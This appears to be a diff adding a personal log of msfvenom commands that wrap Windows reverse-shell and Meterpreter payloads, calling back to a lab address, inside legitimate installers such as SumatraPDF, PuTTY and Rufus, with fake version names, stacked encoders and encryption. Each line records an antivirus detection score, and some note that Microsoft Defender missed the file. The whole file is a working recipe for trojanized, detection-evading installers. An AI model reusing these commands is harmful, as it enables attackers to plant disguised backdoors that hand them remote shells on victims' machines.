@@ -1,0 +1,31 @@
+msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp lhost=192.168.56.101 lport=4546 -x SumatraPDF-3.4.6-64.exe  -f exe -o sumatrapdf.exe (22/70)
+
+msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp lhost=192.168.56.101 lport=4546 -e cmd/powershell_base64 -x SumatraPDF-3.4.6-64.exe -k  -f exe -o sumatrapdf2.0.exe (30/70)
+
+msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp lhost=192.168.56.101 lport=4546 -e cmd/powershell_base64 -f raw | msfvenom --platform windows -a x64 -e x64/xor -i 5 -x SumatraPDF-3.4.6-64.exe -k -f exe -o SumatraPDF-3.4.7.exe (13/70 detection rate - Microsoft detected)
+
+msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp lhost=192.168.56.101 lport=4546 -e cmd/powershell_base64 -f raw | msfvenom --platform windows -a x64 -e x64/xor -i 25 -x SumatraPDF-3.4.6-64.exe -k -f exe -o SumatraPDF-3.3.exe (15/70)
+
+msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp lhost=192.168.56.101 lport=4546 -e x64/xor_dynamic -i 25 -f raw | msfvenom --platform windows -a x64 -e cmd/powershell_base64 -x SumatraPDF-3.4.6-64.exe -k -f exe-only -o SumatraPDF-3.4.8.exe (10/70 detection rate - Microsoft detected)
+
+msfvenom --platform windows -p windows/meterpreter_reverse_tcp lhost=192.168.56.101 lport=4546 -e x86/shikata_ga_nai -i 15 -f raw | msfvenom --platform windows -a x86 -e x86/xor_dynamic -i 10 -x SumatraPDF-3.4.6-32.exe -f exe -o SumatraPDF-3.4.2.exe (31/71)
+
+msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp lhost=192.168.56.101 lport=4546 -e x64/xor_dynamic -i 35 -f raw | msfvenom --platform windows -a x64 -e cmd/powershell_base64 --encrypt rc4 --encrypt-key GandalfTheGrey111295 -x SumatraPDF-3.4.6-64.exe -k -f exe -o SumatraPDF-3.4.9.exe (14/69 detection rate - Microsoft detected)
+
+msfvenom --platform windows -a x64 -p windows/x64/powershell_reverse_tcp lhost=192.168.56.101 lport=4546 -e x64/xor_dynamic -i 30 -f raw | msfvenom --platform windows -a x64 -e cmd/powershell_base64 --encrypt aes-256 --encrypt-key GandalfTheWhite111295 -x SumatraPDF-3.4.6-64.exe -k -f exe -o SumatraPDF-3.4.12.exe (13/70 detection rate - Microsoft detected)
+
+msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp lhost=192.168.56.101 lport=4546 -e x64/xor_dynamic -i 25 -f raw | msfvenom --platform windows -a x64 -e cmd/powershell_base64 -x putty.exe -k -f exe -o puttyx.exe (37/69)
+
+msfvenom --platform windows -a x64 -p windows/x64/meterpreter_reverse_tcp lhost=192.168.56.101 lport=4546 -e x64/xor_dynamic -i 50 -x putty.exe -k -f exe -o puttyx.exe (35/70 microsoft UNDETECTED)
+
+msfvenom --platform windows -a x64 -p windows/x64/meterpreter_reverse_tcp lhost=192.168.56.101 lport=4546 -e x64/xor_dynamic -i 20 -x rufus-4.0.exe -f exe -o rufus-4.3.exe (29/71 Microsoft UNDETECTED)
+
+msfvenom --platform windows -p windows/meterpreter_reverse_tcp lhost=192.168.56.101 lport=4546 -e x86/shikata_ga_nai -i 15 -x SumatraPDF-3.4.6-32.exe -f exe -o SumatraPDF-3.4.0.exe (29/71)
+
+msfvenom --platform windows -p windows/meterpreter_reverse_tcp lhost=192.168.56.101 lport=4546 -e x86/shikata_ga_nai -i 15 -f raw | msfvenom --platform windows -a x86 -e x86/xor_dynamic -i 10 -x putty_x86.exe -k -f exe -o puttyx86.exe (47/71)
+
+msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp lhost=192.168.56.101 lport=4546 -e x64/xor_dynamic -i 25 -f raw | msfvenom --platform windows -a x64 -e cmd/powershell_base64 -x putty.exe -k -f exe -o putty1.exe (37/70)
+
+msfvenom --platform windows -a x64 -p windows/x64/powershell_reverse_tcp lhost=192.168.56.101 lport=4546 -e x64/xor -i 20 -f raw | msfvenom --platform windows -a x64 -e cmd/powershell_base64 -x putty.exe -k -f exe -o putty-2.1.exe (41/70)
+
+msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp lhost=192.168.56.101 lport=4546 -e x64/xor_dynamic -i 20 -f raw | msfvenom --platform windows -a x64 -e cmd/powershell_base64 -x rufus-4.0.exe -f exe -o rufus-4.5.exe (30/70)
